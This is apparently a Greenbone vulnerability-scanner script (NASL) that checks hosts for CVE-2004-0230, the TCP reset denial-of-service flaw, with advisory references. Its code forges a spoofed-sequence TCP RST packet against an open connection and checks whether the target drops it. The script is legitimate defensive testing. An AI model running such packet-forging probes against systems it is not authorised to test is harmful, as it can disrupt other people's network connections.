# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902815");
  script_version("2025-07-29T05:44:59+0000");
  script_cve_id("CVE-2004-0230");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-07-29 05:44:59 +0000 (Tue, 29 Jul 2025)");
  script_tag(name:"creation_date", value:"2012-03-01 15:15:15 +0530 (Thu, 01 Mar 2012)");
  script_name("TCP Sequence Number Approximation Reset DoS Vulnerability (Apr 2004)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("secpod_open_tcp_ports.nasl", "global_settings.nasl");
  script_mandatory_keys("TCP/PORTS");
  script_exclude_keys("keys/islocalhost", "keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/alerts/2004/04/20/vulnerabilities-tcp");
  script_xref(name:"URL", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/15886");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210124082256/http://www.securityfocus.com/bid/10183");
  script_xref(name:"URL", value:"https://www.ibm.com/support/pages/apar/IY55949");
  script_xref(name:"URL", value:"https://www.ibm.com/support/pages/apar/IY55950");
  script_xref(name:"URL", value:"https://web.archive.org/web/20160913121458/http://www-01.ibm.com/support/docview.wss?uid=isg1IY62006");
  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2005/ms05-019");
  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2006/ms06-064");
  script_xref(name:"URL", value:"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20040420-tcp-nonios");

  script_tag(name:"summary", value:"Various TCP services of different vendors are prone to a denial
  of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"A TCP Reset packet with a different sequence number is sent to
  the target. A previously open connection is then checked to see if the target closed it or not.

  Note: At least one open TCP port needs to be available and detected at the target host for this
  vulnerability check.");

  script_tag(name:"insight", value:"The flaw is triggered when spoofed TCP Reset packets are
  received by the targeted TCP stack and will result in loss of availability for the attacked TCP
  services.");

  script_tag(name:"affected", value:"The TCP/IP v4 stack of various products / vendors including:

  - Microsoft Windows

  - Cisco

  - Juniper Networks Junos OS

  - IBM AIX

  are known to be affected. Other products or vendors might be affected as well.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to guess
  sequence numbers and cause a denial of service to persistent TCP connections by repeatedly
  injecting a TCP RST packet.");

  script_tag(name:"solution", value:"- Please see the referenced advisories for more information on
  obtaining and applying fixes

  - Please contact the relevant vendor for more background information");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("port_service_func.inc");

if(TARGET_IS_IPV6() || islocalhost())
  exit(0);

port = tcp_get_first_open_port();

if(!soc = open_sock_tcp(port))
  exit(0);

if(!srcport = get_source_port(soc))
  exit(0);

dstip = get_host_ip();
srcip = this_host();

filter = string("tcp and src ", dstip, " and dst ", srcip, " and dst port ", srcport, " and src port ", port);
res = send_capture(socket:soc, data:"X", pcap_filter:filter);
if(!res) {
  close(soc);
  exit(0);
}

tcp_seq = get_tcp_element(tcp:res, element:"th_ack");
flags = get_tcp_element(tcp:res, element:"th_flags");
if(!tcp_seq || (flags & TH_FIN) || (flags & TH_RST)) {
  close(soc);
  exit(0);
}

ip = forge_ip_packet(ip_v   : 4,
                     ip_hl  : 5,
                     ip_tos : 0,
                     ip_len : 20,
                     ip_id  : rand(),
                     ip_p   : IPPROTO_TCP,
                     ip_ttl : 255,
                     ip_off : 0,
                     ip_src : srcip);

tcp = forge_tcp_packet(ip       : ip,
                       th_ack   : 0,
                       th_dport : port,
                       th_flags : TH_RST,
                       th_seq   : tcp_seq + 1024,
                       th_sport : srcport,
                       th_x2    : 0,
                       th_off   : 5,
                       th_win   : 1024,
                       th_urp   : 0);
send_packet(tcp, pcap_active:FALSE);

res = send_capture(socket:soc, data:"X", pcap_filter:filter);
close(soc);

if(res) {
  flags = get_tcp_element(tcp:res, element:"th_flags");
  if(flags & TH_RST) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
